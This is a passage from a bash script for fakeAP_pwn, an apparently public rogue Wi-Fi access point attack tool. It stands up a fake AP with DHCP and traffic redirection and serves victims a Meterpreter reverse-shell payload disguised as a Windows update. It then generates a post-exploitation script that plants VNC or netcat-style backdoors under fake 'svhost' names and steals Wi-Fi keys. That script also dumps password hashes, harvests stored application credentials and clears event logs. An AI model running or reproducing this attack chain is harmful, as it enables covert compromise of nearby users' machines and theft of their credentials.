      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "$command"
      sleep 1
   fi
fi
command="ifconfig $wifiInterface down"
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing down $wifiInterface" -e "$command" &
sleep 1
command="ifconfig $wifiInterface up"
#if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing up $wifiInterface" -e "$command"
command=$(ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
if [ -n "$command" ] ; then
   command="kill $command"
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing everything on the interface " -e "$command" # to prevent interference
fi
if [ "$apType" == "airbase-ng" ] ; then
   command="airmon-ng start $wifiInterface"
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Starting)" -e "$command"
      sleep 1
      ifconfig mon0 mtu $mtu                                                             # Changes MTU for FakeAP
      command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
      if [ "$command" != "$monitorInterface" ] ; then
         sleep 5 # Some people need to wait a little bit longer (e.g. VM), some don't. Don't force the ones that don't need it!
         command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
      if [ "$command" != "$monitorInterface" ] ; then
         echo -e "\e[00;31m[-]\e[00m The monitor interface $monitorInterface, isn't correct." 1>&2
      if [ "$debug" == "true" ] ; then iwconfig; fi
      cleanup
      fi
   fi
fi

#command=$(aireplay-ng --test $monitorInterface)
#if [ `echo $command | grep "Found 0 APs"` ] ; then echo -e "\e[00;31m[-]\e[00m Couldn't test packet injection" 1>&2;
#elif ! [ `echo $command | egrep "Injection is working"` ] ; then
   #echo -e "\e[00;31m[-]\e[00m The monitor interface $monitorInterface, doesn't support packet injecting." 1>&2
   #cleanup
#fi

#----------------------------------------------------------------------------------------------#
if [ "$apType" == "airbase-ng" ] ; then
   if [ "$fakeAPmac" == "random" ] || [ "$fakeAPmac" == "set" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."; fi
      command="ifconfig $monitorInterface down &&"
      if [ "$fakeAPmac" == "random" ] ; then  command="$command macchanger -A $monitorInterface"; fi
      if [ "$fakeAPmac" == "set" ] ; then  command="$command macchanger -m $macAddress $monitorInterface"; fi
      command="$command && ifconfig $monitorInterface up"
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "$command" &
      sleep 2
   fi
   if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
      macAddress=$(macchanger --show $monitorInterface | awk -F " " '{print $3}')
      macAddressType=$(macchanger --show $monitorInterface | awk -F "Current MAC: " '{print $2}')
      echo -e "\e[01;33m[i]\e[00m       macAddress=$macAddressType"
   fi
fi

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Creating: Scripts"
# metasploit script
if [ -e /tmp/fakeAP_pwn.rb ] ; then rm /tmp/fakeAP_pwn.rb; fi
echo "# ID: fakeAP_pwn.rb v$version
# Author: g0tmi1k at http://g0tmi1k.blogspot.com

################## Variable Declarations ##################
@client   = client
host,port = session.tunnel_peer.split(':')
os        = @client.sys.config.sysinfo['OS']
host      = @client.sys.config.sysinfo['Computer']
arch      = @client.sys.config.sysinfo['Architecture']
user      = @client.sys.config.getuid
date      = Time.now.strftime(\"%Y-%m-%d.%H:%M:%S\")
uac       = 0

######################## Functions ########################
def doLinux
	print_status(\"Coming soon...\")
end

def doOSX
	print_status(\"Coming soon...\")
end

def doWindows(uac)
	session.response_timeout=120
	begin"> /tmp/fakeAP_pwn.rb
if [ "$payload" == "vnc" ] ; then
   echo "		print_status(\"   Stopping: winvnc.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost101.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"  Uploading: VNC\")
		exec = upload(session,\"$www/winvnc.exe\",\"svhost101.exe\",\"\")
		upload(session,\"$www/vnchooks.dll\",\"vnchooks.dll\",\"\")
		upload(session,\"$www/vnc.reg\",\"vnc.reg\",\"\")
		sleep(1)

		print_status(\"Configuring: VNC\")
		execute(session,\"cmd.exe /C regedit.exe /S %TEMP%\vnc.reg\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds for target to click \\\"yes\\\"\")
			sleep(30)
		end

		print_status(\"  Executing: winvnc.exe (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -kill -run\", nil)
		sleep(1)

		print_status(\"Configuring: VNC (Reserving connection).\")
		execute(session,\"cmd.exe /C #{exec} -connect 10.0.0.1\", nil)

		print_status(\"   Deleting: Traces\")
		delete(session, \"%SystemDrive%\\\vnc.reg\")" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "sbd" ] ; then
   echo "		print_status(\" Stopping: sbd.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost102.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: SecureBackDoor\")
		exec = upload(session,\"$www/sbd.exe\",\"svhost102.exe\",\"\")
		sleep(1)

		print_status(\"Executing: sbd.exe (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil)" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "wkv" ] ; then
   echo "	print_status(\"  Uploading: Wireless Key Viewer\")
		if @client.sys.config.sysinfo['Architecture'] =~ (/x64/)
			exec = upload(session,\"$www/wkv-x64.exe\",\"\",\"\")
		else
			exec = upload(session,\"$www/wkv-x86.exe\",\"\",\"\")
		end
		sleep(1)

		print_status(\"  Executing: wkv.exe (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} /stabular %TEMP%\\\wkv.txt\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds for target to click \\\"yes\\\"\")
			sleep(30)
		end

		# Check for file!
		print_status(\"Downloading: WiFi keys (/tmp/fakeAP_pwn.wkv)\")
		session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%TEMP%\\\wkv.txt\")

		print_status(\"   Deleting: Traces\")
		delete(session, exec)
		delete(session, \"%TEMP%\\\wkv.txt\")" >> /tmp/fakeAP_pwn.rb
else
   echo "		print_status(\"Stopping: backdoor.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost103.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: backdoor.exe ($backdoorPath)\")
		exec = upload(session,\"$backdoorPath\",\"svhost103.exe\",\"\")
		sleep(1)

		print_status(\"Executing: backdoor.exe\")
		execute(session,\"cmd.exe /C #{exec}\", nil)" >> /tmp/fakeAP_pwn.rb
fi
echo "		sleep(1)

	rescue ::Exception => e
		print_status(\"Error: #{e.class} #{e}\")
	end
end

def upload(session,file,filename = \"\",trgloc = \"\")
	if not ::File.exists?(file)
		raise \"File to upload does not exists!\"
	else
		if trgloc == \"\"
			location = session.fs.file.expand_path(\"%TEMP%\")
		else
			location = trgloc
		end
		begin
			if filename == \"\"
				ext = file[file.rindex(\".\") .. -1]
				if ext and ext.downcase == \".exe\"
					fileontrgt = \"#{location}\\\svhost#{rand(100)}.exe\"
				else
					fileontrgt = \"#{location}\\\TMP#{rand(100)}#{ext}\"
				end
			else
				fileontrgt = \"#{location}\\\#{filename}\"
			end
			session.fs.file.upload_file(\"#{fileontrgt}\",\"#{file}\")
		rescue ::Exception => e
			print_status(\"Error uploading file #{file}: #{e.class} #{e}\")
		end
	end
	return fileontrgt
end

def execute(session,cmdexe,opt)
	r=''
	session.response_timeout=120
	begin
		r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
		r.close
	rescue ::Exception => e
		print_status(\"Error Running Command #{cmdexe}: #{e.class} #{e}\")
	end
end

def delete(session, path)
   r = session.sys.process.execute(\"cmd.exe /c del /F /S /Q \" + path, nil, {'Hidden' => 'true'})
   while(r.name)
      select(nil, nil, nil, 0.10)
   end
   r.close
end

def checkUAC(session)
	begin
		open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Policies\\\System\", KEY_READ)
		value = open_key.query_value(\"EnableLUA\").data
	rescue ::Exception => e
		print_status(\"Error Checking UAC: #{e.class} #{e}\")
	end
	return (value)
end


########################### Main ##########################
print_line(\"[*] fakeAP_pwn $version\")" >> /tmp/fakeAP_pwn.rb
#if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
echo "print_status(\"-------------------------------------------\")
print_status(\"Date: #{date}\")
print_status(\"  IP: #{host}:#{port}\")
print_status(\"  OS: #{os}\")
if os =~ (/Windows Vista/) || os =~ (/Windows 7/)
	uac = checkUAC(session)
	if uac == 1
		print_error(\" UAC: Enabled\")
		session.core.use(\"priv\")
		#run kitrap0d # x86 ONLY
		#client.execute_script(\"script\",\"args\") #client.execute_script(\"multi_console_command\",[\"-cl\",'help,help\"])
	else
		print_status(\" UAC: Disabled\")
	end
end
print_status(\"Arch: #{arch}\")
print_status(\"Host: #{host}\")
print_status(\"User: #{user}\")
print_status(\"Mode: $payload\")
print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
#fi
echo "if os =~ /Linux/
	doLinux
elsif os =~ /OSX/
	doOSX
elsif os =~ /Windows/
#	run getcountermeasure.rb -d
	doWindows(uac)
else
	print_error(\"Unsupported OS\")
	exit
end

print_status(\"Unlocking: fakeAP_pwn\")
output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
output.puts(\"fakeAP_pwn\")
output.close
sleep(1)" >> /tmp/fakeAP_pwn.rb
if [ "$debug" == "true" ] || [ "$extras" == "true" ] ; then
echo "print_status(\"-------------------------------------------\")
print_status(\"Extras\")
screenshot
#----
session.core.use(\"priv\") #use priv
getsystem
hashes = session.priv.sam_hashes  #hashdump #> /tmp/fakeAP_Pwn.hash
####################################################################
   begin
      session.core.use(\"priv\")
      hashes = session.priv.sam_hashes
      print_status(\"Capturing windows hashes ...\")
      File.open(File.join(logs, \"hashes.txt\"), \"w\") do |fd|
         hashes.each do |user|
            fd.puts(user.to_s)
         end
      end
   rescue ::Exception => e
      print_status(\"Error dumping hashes: #{e.class} #{e}\")
   end
####################################################################
#----
sysinfo
ps
ipconfig
route
#enumdesktops
#getdesktop
#setdesktop
#----
run checkvm.rb
run dumplinks.rb -e
run enum_firefox.rb
run enum_logged_on_users.rb -c -l
run enum_putty.rb
run get_application_list.rb
run getcountermeasure.rb -d -k
run get_env.rb
run get_filezilla_creds.rb -c
run get_loggedon_users.rb -c -l
run get_pidgin_creds.rb -b -c -l
run getvncpw.rb
#run killav.rb
run remotewinenum.rb
run scraper.rb
run winenum.rb -r
#----
clearev
print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
fi
echo "

print_line(\"[*] Done!\")" >> /tmp/fakeAP_pwn.rb
if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.rb"; fi
if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.rb ; fi

# dhcp script
if [ -e /tmp/fakeAP_pwn.dhcp ] ; then rm /tmp/fakeAP_pwn.dhcp; fi
echo "# fakeAP_pwn.dhcp v$version
ddns-update-style interim;
ignore client-updates; # Ignore all client requests for DDNS update
authoritative;
default-lease-time 86400; # 24 hours
max-lease-time 172800; # 48 hours
log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.150 10.0.0.250;
  option routers 10.0.0.1;
  option subnet-mask 255.255.255.0;
  option broadcast-address 10.0.0.255;
  option domain-name \"Home.com\";
  option domain-name-servers $gatewayIP;   # OR 10.0.0.1;
  option netbios-name-servers 10.0.0.100;  # OR 10.0.0.99;
}" > /tmp/fakeAP_pwn.dhcp
if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dhcp"; fi
if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dhcp; fi

# apache - virtual host
if [ -e /etc/apache2/sites-available/fakeAP_pwn ] ; then rm /etc/apache2/sites-available/fakeAP_pwn; fi
echo "# fakeAP_pwn v$version
	<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot $www
	ServerName \"10.0.0.1\"
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory $www>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>
	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <directory \"/usr/lib/cgi-bin\">
                AllowOverride None
                Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </directory>
	ErrorLog /var/log/apache2/fakeAP_pwn-error.log
	LogLevel warn
	CustomLog /var/log/apache2/fakeAP_pwn-access.log combined
        ErrorDocument 403 /index.php
        ErrorDocument 404 /index.php
</VirtualHost>
<IfModule mod_ssl.c>
<VirtualHost _default_:443>
	ServerAdmin webmaster@localhost
	DocumentRoot $www
	ServerName \"10.0.0.1\"
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory $www>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>
        <directory \"/usr/lib/cgi-bin\">
                AllowOverride None
                Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </directory>
	ErrorLog /var/log/apache2/error.log
	LogLevel warn
	CustomLog /var/log/apache2/ssl_fakeAP_pwn-access.log combined
        ErrorDocument 403 /index.php
        ErrorDocument 404 /index.php
	SSLEngine on
	SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
	SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
	<FilesMatch \"\.(cgi|shtml|phtml|php)$\">
		SSLOptions +StdEnvVars
	</FilesMatch>
	<Directory /usr/lib/cgi-bin>
		SSLOptions +StdEnvVars
	</Directory>
	BrowserMatch \"MSIE [2-6]\" \
		nokeepalive ssl-unclean-shutdown \
		downgrade-1.0 force-response-1.0
	BrowserMatch \"MSIE [17-9]\" ssl-unclean-shutdown
</VirtualHost>
</IfModule>" > /etc/apache2/sites-available/fakeAP_pwn
if [ "$verbose" == "2" ]  ; then echo "Created: /etc/apache2/sites-available/fakeAP_pwn"; fi
if [ "$debug" == "true" ] ; then cat /etc/apache2/sites-available/fakeAP_pwn; fi

# dns script
#if [ "$apMode" == "non" ] ; then
#   if [ -e /tmp/fakeAP_pwn.dns ] ; then rm /tmp/fakeAP_pwn.dns; fi
#   echo "# fakeAP_pwn.dns v$version
# fakeAP_pwn
#use auxiliary/server/fakedns
#set INTERFACE $apInterface
#set DOMAINBYPASS *
#set SRVHOST 0.0.0.0
#set SRVPORT 53
#set TARGETHOST 10.0.0.1
#run" > /tmp/fakeAP_pwn.dns
#   if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dns"; fi
#   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dns; fi
#fi

# hostapd config
if [ "$apType" == "hostapd" ] ; then
   if [ -e /tmp/fakeAP_pwn.hostapd ] ; then rm /tmp/fakeAP_pwn.hostapd; fi
   echo "# fakeAP_pwn.hostapd v$version
interface=$apInterface
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
dump_file=/tmp/hostapd.dump
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0
ssid=$ESSID
hw_mode=g
channel=$fakeAPchannel
beacon_int=100
dtim_period=2
max_num_sta=255
rts_threshold=2347
fragm_threshold=2346
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0
#wmm_enabled=1
#wmm_ac_bk_cwmin=4
#wmm_ac_bk_cwmax=10
#wmm_ac_bk_aifs=7
#wmm_ac_bk_txop_limit=0
#wmm_ac_bk_acm=0
#wmm_ac_be_aifs=3
#wmm_ac_be_cwmin=4
#wmm_ac_be_cwmax=10
#wmm_ac_be_txop_limit=0
#wmm_ac_be_acm=0
#wmm_ac_vi_aifs=2
#wmm_ac_vi_cwmin=3
#wmm_ac_vi_cwmax=4
#wmm_ac_vi_txop_limit=94
#wmm_ac_vi_acm=0
#wmm_ac_vo_aifs=2
#wmm_ac_vo_cwmin=2
#wmm_ac_vo_cwmax=3
#wmm_ac_vo_txop_limit=47
#wmm_ac_vo_acm=0
eapol_key_index_workaround=0
eap_server=0
own_ip_addr=127.0.0.1" > /tmp/fakeAP_pwn.hostapd
   if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.hostapd"; fi
   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.hostapd; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$apMode" != "normal" ] ; then
   #echo -e "\e[01;32m[>]\e[00m Creating exploit.(Linux)"
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $www/kernal_1.83.90-5+lenny2_i386.deb"; fi
   #xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $www/kernal_1.83.90-5+lenny2_i386.deb"
   #echo -e "\e[01;32m[>]\e[00m Creating exploit..(OSX)"
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"; fi
   #xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"
   echo -e "\e[01;32m[>]\e[00m Creating: Exploit (Windows)"
   if [ ! -e $www/sbd.exe ] ; then echo -e "\e[00;31m[-]\e[00m sbd.exe is not in $www" 1>&2; cleanup; fi
   if [ -e $www/Windows-KB183905-x86-ENU.exe ]; then rm $www/Windows-KB183905-x86-ENU.exe; fi
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -e x86/countdown -c 2 -t raw | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $www/Windows-KB183905-x86-ENU.exe"
   command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe"
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$command"
   if [ ! -e $www/Windows-KB183905-x86-ENU.exe ] ; then echo -e "\e[00;31m[-]\e[00m Failed to created exploit." 1>&2; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Starting: Fake access point."
if [ "$apType" == "airbase-ng" ] ; then

   loopMain="False"
   i="1"
   for i in {1..3} ; do # Main Loop
      command="airbase-ng $monitorInterface -a $macAddress -W 0 -y -c $fakeAPchannel -e \"$ESSID\""
      if [ "$respond2All" == "true" ] ; then command="$command -P -C 60"; fi
      if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then command="$command -v"; fi
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
      $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "$command" &
      sleep 3
      ifconfig at0 up                                       # The new FakeAP interface
#if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
      command=$(ifconfig -a | grep at0 | awk '{print $1}')
      if [ "$command" != "at0" ] ; then
         echo -e "\e[00;31m[-]\e[00m Couldn't create the access point's interface." 1>&2
      else
         command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
         if [ ! $command ]; then loopMain="True"; break; fi # $interface isnt WiFi, therefore cant test.
         echo -e "\e[01;33m[i]\e[00m Attempt #$x to detect the fake access point."
         loopSub="False"
         x="1"
         for x in {1..5} ; do # Sub loop
            echo -e "\e[01;33m[i]\e[00m Try #$x scanning for the fake access point."
            testAP $ESSID $wifiInterface
            return_val=$?
            if [ "$return_val" -eq "0" ] ; then loopSub="True"; break; # Sub loop
            elif [ "$return_val" -eq "1" ] ; then echo -e "\e[00;31m[-]\e[00m Coding error";
            elif [ "$return_val" -eq "2" ] ; then echo -e "\e[00;31m[-]\e[00m Couldn't detect a single AP";
            elif [ "$return_val" -eq "3" ] ; then echo -e "\e[00;31m[-]\e[00m Couldn't find the fake AP";
            else echo -e "\e[00;31m[-]\e[00m Unknown error."; fi
         done # Sub loop
         if [ $loopSub == "True" ] ; then
            echo -e "\e[01;33m[i]\e[00m Detected the fake access point."
            loopMain="True"
            break; # Main Loop
         fi
      fi
# Ping test? Make sure its working working...
      if [ -z "$(pgrep airbase-ng)" ] ; then
         echo -e "\e[00;31m[-]\e[00m airbase-ng failed to start." 1>&2
         if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
         cleanup
      fi
   sleep 1
   killall airbase-ng # Start fresh...
   sleep 3
   done # Main Loop
   if [ $loopMain == "False" ] ; then
      echo -e "\e[00;31m[-]\e[00m Couldn't detect the fake access point." 1>&2
      cleanup
   fi
elif [ "$apType" == "hostapd" ] ; then
   command="hostapd /tmp/fakeAP_pwn.hostapd"
   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
   $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "$command" &
   sleep 3
   if [ -z "$(pgrep hostapd)" ] ; then
      echo -e "\e[00;31m[-]\e[00m hostapd failed to start." 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
      cleanup
   fi
fi


if [ "$diagnostics" == "true" ] ; then
   sleep 5
   echo "*Testing AP******************************" >> fakeAP_pwn.output
   echo -e "\e[01;34m[i]\e[00m ping -I $apInterface -c 4 10.0.0.1"
   ping -I $apInterface -c 4 10.0.0.1 >> fakeAP_pwn.output

   echo "*Commands********************************" >> fakeAP_pwn.output
fi

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Configuring environment..."
ifconfig lo up
ifconfig $apInterface 10.0.0.1 netmask 255.255.255.0
ifconfig $apInterface mtu $mtu
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush       # remove existing rules
iptables --delete-chain
iptables --zero
echo 1 > /proc/sys/net/ipv4/ip_forward
command=$(cat /proc/sys/net/ipv4/ip_forward)
if [ $command != "1" ] ; then
  echo -e "\e[00;31m[-]\e[00m Can't enable ip_forward" 1>&2
  cleanup
fi
if [ "$apMode" == "normal" ] ; then
   iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
   iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
   iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP
      #iptables --table nat --append POSTROUTING -s 10.0.0.0/24 --out-interface $interface --jump MASQUERADE
      #iptables -A FORWARD -s 10.0.0.0/24 -o $interface -j ACCEPT
      #iptables -A FORWARD -d 10.0.0.0/24 -m conntrack --ctstate ESTABLISHED,RELATED -i $interface -j ACCEPT
      #iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
      #iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP
      #iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 -i $interface -d $gatewayIP -p all -j DROP  #protect the gateway
elif [ "$apMode" == "transparent" ] || [ "$apMode" == "non" ] ; then
   iptables --table nat --append PREROUTING --in-interface $apInterface --jump REDIRECT
   #iptables --table nat --append PREROUTING --proto tcp --jump DNAT --to-destination 64.111.96.38          # Blackhole Routing - Send everything to that IP address
fi

# DHCP
command="chmod 775 /var/run/"
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x7+100+0 -T "fakeAP_pwn v$version - DHCP" -e "$command"
command="touch /var/lib/dhcp3/dhcpd.leases"
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x7+100+0 -T "fakeAP_pwn v$version - DHCP" -e "$command"
if [ -e /etc/apparmor.d/usr.sbin.dhcpd3 ] ; then # ubuntu - Fixes folder persmissions
   if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.bkup ]       ; then rm /etc/apparmor.d/usr.sbin.dhcpd3.bkup; fi
   if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn ] ; then rm /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn; fi
   find="\/etc\/dhcpd.conf r,"
   replace="\/etc\/dhcpd.conf r,\n  \/tmp\/fakeAP_pwn.dhcp r,"
   sed "s/$replace/$find/g" /etc/apparmor.d/usr.sbin.dhcpd3 > /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn # Removes any dups
   sed "s/$find/$replace/g" /etc/apparmor.d/usr.sbin.dhcpd3 > /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn
   mv /etc/apparmor.d/usr.sbin.dhcpd3 /etc/apparmor.d/usr.sbin.dhcpd3.bkup
   mv /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn /etc/apparmor.d/usr.sbin.dhcpd3
fi
# ubuntu - PID need

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;32m[>]\e[00m Starting: DHCP server"
command="dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp $apInterface" # -d = logging, -f = forground
if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
$xterm -geometry 75x5+10+75 -T "fakeAP_pwn v$version - DHCP server" -e "$command" &
sleep 2
if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
   echo -e "\e[00;31m[-]\e[00m DHCP server failed to start." 1>&2
   if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.output; fi
   cleanup
fi

#----------------------------------------------------------------------------------------------#
if [ "$apMode" != "normal" ] ; then
   echo -e "\e[01;32m[>]\e[00m Starting: Metasploit"
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
